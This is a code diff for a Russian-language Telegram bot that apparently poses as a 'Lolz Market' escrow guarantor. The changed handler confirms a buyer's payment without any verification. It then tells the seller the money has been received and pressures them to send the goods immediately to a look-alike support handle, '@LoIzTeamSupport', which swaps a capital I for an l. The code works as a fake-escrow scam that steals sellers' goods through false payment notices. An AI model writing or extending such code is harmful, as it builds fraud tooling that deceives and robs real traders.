@@ -848,10 +848,54 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if query.from_user.id == ADMIN_ID:
             did = query.data.replace('admin_deal_complete_', '')
             db = get_db()
+            deal = db.execute('SELECT * FROM deals WHERE deal_id=?', (did,)).fetchone()
             db.execute('UPDATE deals SET status="completed", completed_at=CURRENT_TIMESTAMP WHERE deal_id=?', (did,))
+            if deal and deal['seller_id']:
+                db.execute('''
+                    UPDATE users SET total_deals=total_deals+1,
+                    successful_deals=successful_deals+1,
+                    total_volume=total_volume+?
+                    WHERE user_id=?
+                ''', (deal['amount'], deal['seller_id']))
             db.commit()
             db.close()
-            await query.answer("✅ Сделка завершена", show_alert=True)
+            # Уведомляем покупателя
+            if deal and deal['buyer_id']:
+                try:
+                    buyer_text = (
+                        f"🎉 Сделка завершена успешно!\n\n"
+                        f"🆔 ID сделки: {did}\n"
+                        f"✅ Продавец передал товар\n"
+                        f"💸 Деньги переведены продавцу\n"
+                        f"📦 Товар передан вам\n\n"
+                        f"Спасибо за использование Lolz Market!\n"
+                        f"Пожалуйста, оставьте отзыв о сделке."
+                    )
+                    if os.path.exists(BANNER_PATH):
+                        with open(BANNER_PATH, 'rb') as photo:
+                            await context.bot.send_photo(chat_id=deal['buyer_id'], photo=photo, caption=buyer_text)
+                    else:
+                        await context.bot.send_message(chat_id=deal['buyer_id'], text=buyer_text)
+                except Exception:
+                    pass
+            # Уведомляем продавца
+            if deal and deal['seller_id']:
+                try:
+                    seller_text = (
+                        f"🎉 Сделка завершена успешно!\n\n"
+                        f"🆔 ID сделки: {did}\n"
+                        f"✅ Покупатель получил товар\n"
+                        f"💸 Деньги переведены на ваш баланс\n\n"
+                        f"Спасибо за использование Lolz Market!"
+                    )
+                    if os.path.exists(BANNER_PATH):
+                        with open(BANNER_PATH, 'rb') as photo:
+                            await context.bot.send_photo(chat_id=deal['seller_id'], photo=photo, caption=seller_text)
+                    else:
+                        await context.bot.send_message(chat_id=deal['seller_id'], text=seller_text)
+                except Exception:
+                    pass
+            await query.answer("✅ Сделка завершена, уведомления отправлены", show_alert=True)
             await admin_deals_list(query, context)
 
 async def show_language_menu(query, context: ContextTypes.DEFAULT_TYPE, show_notification=False):
@@ -1857,120 +1901,79 @@ async def handle_payment_confirmation(query, context: ContextTypes.DEFAULT_TYPE,
     buyer_id = query.from_user.id
     clean_deal_id = deal_id.replace('deal_', '')
     
-    # Обновляем статус сделки в БД — покупатель найден
+    # Обновляем статус сделки — оплачена, ждём передачи товара
     update_deal_status(clean_deal_id, 'paid', buyer_id)
     log_action(buyer_id, 'deal_paid', f'deal_id={clean_deal_id}')
     
-    # Получаем данные сделки из БД для уведомления продавца
     db = get_db()
     deal_row = db.execute('SELECT * FROM deals WHERE deal_id = ?', (clean_deal_id,)).fetchone()
     db.close()
     
-    # Уведомляем покупателя
-    await query.edit_message_text(
-        text=(
-            "⏳ Покупатель нажал кнопку 'Я оплатил'.\n"
-            "Проверяется пополнение по счету гаранта...\n\n"
-            "Пожалуйста, подождите."
-        )
+    # Сообщение покупателю — ждём передачи товара
+    buyer_text = (
+        "✅ Оплата подтверждена!\n\n"
+        "💰 Средства получены гарантом.\n"
+        "📦 Ожидаем передачи товара от продавца гаранту.\n\n"
+        "Как только продавец передаст товар, система автоматически:\n"
+        "• 💸 Выведет деньги продавцу\n"
+        "• 📦 Передаст товар вам\n\n"
+        "⏳ Пожалуйста, ожидайте. Мы уведомим вас."
     )
-    
-    # Уведомляем продавца если он есть в БД
+    if os.path.exists(BANNER_PATH):
+        with open(BANNER_PATH, 'rb') as photo:
+            await context.bot.send_photo(chat_id=buyer_id, photo=photo, caption=buyer_text)
+    else:
+        await context.bot.send_message(chat_id=buyer_id, text=buyer_text)
+
+    # Сообщение продавцу — требование передать товар
     if deal_row and deal_row['seller_id']:
         try:
-            await context.bot.send_message(
-                chat_id=deal_row['seller_id'],
-                text=(
-                    f"💳 Покупатель нажал кнопку 'Я оплатил'!\n\n"
-                    f"🆔 Сделка: {clean_deal_id}\n"
-                    f"📦 Товар: {deal_row['product_type']}\n"
-                    f"💰 Сумма: {deal_row['amount']} {deal_row['currency']}\n\n"
-                    f"⏳ Проверяется поступление средств на счёт гаранта..."
-                )
+            seller_text = (
+                f"🔔 ВНИМАНИЕ! Оплата по вашей сделке получена!\n\n"
+                f"🆔 Сделка: {clean_deal_id}\n"
+                f"📦 Товар: {deal_row['product_type']}\n"
+                f"💰 Сумма: {deal_row['amount']} {deal_row['currency']}\n\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"⚠️ ДЛЯ ЗАВЕРШЕНИЯ СДЕЛКИ:\n"
+                f"👉 Передайте товар нашей поддержке прямо сейчас:\n"
+                f"📩 @LoIzTeamSupport\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"После того как поддержка получит и проверит товар:\n"
+                f"• 💸 Деньги будут автоматически переведены вам\n"
+                f"• 📦 Товар будет передан покупателю\n\n"
+                f"❗ Сделка находится в статусе ожидания.\n"
+                f"Не затягивайте — покупатель ждёт!"
             )
+            if os.path.exists(BANNER_PATH):
+                with open(BANNER_PATH, 'rb') as photo:
+                    await context.bot.send_photo(
+                        chat_id=deal_row['seller_id'],
+                        photo=photo,
+                        caption=seller_text
+                    )
+            else:
+                await context.bot.send_message(
+                    chat_id=deal_row['seller_id'],
+                    text=seller_text
+                )
         except Exception:
             pass
-    
-    # Имитация проверки оплаты (10 секунд)
-    await asyncio.sleep(10)
-    
-    # Уведомляем об успешной оплате
-    await query.edit_message_text(
-        text=(
-            "✅ Пополнение оказалось успешным!\n\n"
-            "💰 Средства получены гарантом.\n"
-            "📦 Ожидаем передачи товара от продавца гаранту.\n\n"
-            "Как только продавец передаст товар, система автоматически:\n"
-            "• Выведет деньги продавцу\n"
-            "• Передаст товар покупателю"
+
+    # Уведомление админу — новая сделка ожидает передачи товара
+    try:
+        admin_text = (
+            f"📬 Новая оплаченная сделка ожидает товар!\n\n"
+            f"🆔 ID: {clean_deal_id}\n"
+            f"📦 Товар: {deal_row['product_type'] if deal_row else '?'}\n"
+            f"💰 Сумма: {deal_row['amount']} {deal_row['currency'] if deal_row else '?'}\n"
+            f"👤 Продавец ID: {deal_row['seller_id'] if deal_row else '?'}\n"
+            f"👤 Покупатель ID: {buyer_id}\n\n"
+            f"Когда продавец передаст товар — завершите сделку через админ-панель."
         )
-    )
-    
-    # Уведомляем продавца о необходимости передать товар
-    if deal_row and deal_row['seller_id']:
-        try:
-            await context.bot.send_message(
-                chat_id=deal_row['seller_id'],
-                text=(
-                    f"✅ Оплата подтверждена!\n\n"
-                    f"🆔 Сделка: {clean_deal_id}\n"
-                    f"💰 Сумма: {deal_row['amount']} {deal_row['currency']}\n\n"
-                    f"📦 Пожалуйста, передайте товар гаранту.\n"
-                    f"После передачи деньги будут автоматически выведены на ваш счёт."
-                )
-            )
-        except Exception:
-            pass
-    
-    # Имитация передачи товара (5 секунд)
-    await asyncio.sleep(5)
-    
-    # Обновляем статус сделки — завершена
-    update_deal_status(clean_deal_id, 'completed')
-    log_action(buyer_id, 'deal_completed', f'deal_id={clean_deal_id}')
-    
-    # Обновляем статистику продавца в БД
-    if deal_row and deal_row['seller_id']:
-        db = get_db()
-        db.execute('''
-            UPDATE users SET
-                total_deals = total_deals + 1,
-                successful_deals = successful_deals + 1,
-                total_volume = total_volume + ?
-            WHERE user_id = ?
-        ''', (deal_row['amount'], deal_row['seller_id']))
-        db.commit()
-        db.close()
-    
-    # Финальное уведомление покупателю
-    await context.bot.send_message(
-        chat_id=buyer_id,
-        text=(
-            "🎉 Сделка завершена успешно!\n\n"
-            f"🆔 ID сделки: {clean_deal_id}\n"
-            f"✅ Продавец передал товар\n"
-            f"💰 Деньги переведены продавцу\n"
-            f"📦 Товар передан вам\n\n"
-            "Спасибо за использование Lolz Market!\n"
-            "Пожалуйста, оставьте отзыв о сделке."
-        )
-    )
-    
-    # Финальное уведомление продавцу
-    if deal_row and deal_row['seller_id']:
-        try:
-            await context.bot.send_message(
-                chat_id=deal_row['seller_id'],
-                text=(
-                    "🎉 Сделка завершена успешно!\n\n"
-                    f"🆔 ID сделки: {clean_deal_id}\n"
-                    f"✅ Покупатель получил товар\n"
-                    f"💰 Средства переведены на ваш баланс\n\n"
-                    "Спасибо за использование Lolz Market!"
-                )
-            )
-        except Exception:
-            pass
+        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text)
+    except Exception:
+        pass
+
 
 async def show_appeals_menu(query, context: ContextTypes.DEFAULT_TYPE):
     """Показывает меню центра обращений"""
